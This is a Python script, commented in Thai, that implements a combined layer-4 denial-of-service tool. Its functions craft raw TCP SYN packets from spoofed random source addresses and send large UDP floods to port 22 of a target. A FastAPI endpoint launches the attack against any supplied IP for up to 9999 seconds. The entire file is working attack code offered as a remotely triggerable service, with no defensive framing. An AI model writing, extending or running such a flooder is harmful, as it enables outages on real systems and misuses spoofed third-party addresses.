import socket
import random
import threading
from datetime import datetime, timedelta
import struct
from fastapi import FastAPI, HTTPException

# สร้าง TCP SYN Packet
def create_syn_packet(source_ip, dest_ip, source_port, dest_port):
    ip_header = struct.pack(
        '!BBHHHBBH4s4s',
        69,  # Version & IHL
        0,  # Type of Service
        40,  # Total Length
        random.randint(1, 65535),  # Identification
        0,  # Flags & Fragment Offset
        64,  # TTL
        socket.IPPROTO_TCP,  # Protocol
        0,  # Header Checksum
        socket.inet_aton(source_ip),
        socket.inet_aton(dest_ip),
    )
    tcp_header = struct.pack(
        '!HHLLBBHHH',
        source_port,
        dest_port,
        random.randint(0, 4294967295),  # Sequence Number
        0,  # Acknowledgment Number
        80,  # Data Offset & Reserved
        2,  # Flags (SYN)
        8192,  # Window Size
        0,  # Checksum
        0,  # Urgent Pointer
    )
    return ip_header + tcp_header

# ฟังก์ชัน TCP SYN Flood
def tcp_syn_flood_raw(target_ip, duration):
    end_time = datetime.now() + timedelta(seconds=duration)
    attack_num = 0

    while datetime.now() < end_time:
        try:
            source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            source_port = random.randint(1024, 65535)

            packet = create_syn_packet(source_ip, target_ip, source_port, 22)
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.sendto(packet, (target_ip, 22))
            attack_num += 1
        except Exception as e:
            print(f"[TCP] Error: {e}")

# ฟังก์ชัน UDP Flood
def udp_flood_raw(target_ip, duration):
    end_time = datetime.now() + timedelta(seconds=duration)
    attack_num = 0

    while datetime.now() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(65507)
            s.sendto(payload, (target_ip, 22))
            attack_num += 1
        except Exception as e:
            print(f"[UDP] Error: {e}")
        finally:
            s.close()

# ฟังก์ชันเริ่มต้นการโจมตีแบบผสม
def start_combined_attack(target_ip, duration):
    print(f"Starting Combined L4 Attack on {target_ip}:22 for {duration} seconds.")
    threading.Thread(target=tcp_syn_flood_raw, args=(target_ip, duration)).start()
    threading.Thread(target=udp_flood_raw, args=(target_ip, duration)).start()

# สร้าง API ด้วย FastAPI
app = FastAPI()

@app.get("/")
def attack(ip: str, time: int):
    if time > 9999:
        raise HTTPException(status_code=400, detail="Duration cannot exceed 9999 seconds")
    try:
        start_combined_attack(ip, time)
        return {"status": "success", "message": f"Attack on {ip}:22 started for {time} seconds"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
